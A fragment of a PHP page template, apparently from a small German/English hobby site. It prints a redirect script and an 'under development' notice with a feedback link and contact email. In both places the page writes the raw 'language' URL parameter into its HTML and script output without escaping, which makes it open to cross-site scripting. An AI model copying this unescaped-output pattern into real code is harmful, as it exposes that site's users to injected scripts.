							}
						}else
						{
								echo "<script> location.href='mainpage.php?language=".$_GET['language']."&action=invalidsession'; </script>";
						}
					echo "</div>";
				echo "</div>";
			echo "</div>";
		echo "</div>";
		echo "<div class=\"notebar\">";
			switch($_GET['language'])
			{
				case 'german':
				$output_note = "Diese Seite befindet sich im aktiven Aufbau. Probleme, Kritik und Vorschläge können entweder via <a href=\"login.php?language=".$_GET['language']."&action=feedback\">Feedback geben</a> oder via Mail an gosseek@hotmail.com gesendet werden. Vielen Dank!";
				break;
				
				case 'english':
				$output_note = "This page is under active development. Problems, criticisms and suggestions can be sent either via <a href=\"login.php?language=".$_GET['language']."&action=feedback\">give feedback</a> or via mail to gosseek@hotmail.com Thank you!";
				break;
			}
			echo $output_note;
		echo "</div>";
	echo "</body>";
echo "</html>";
?>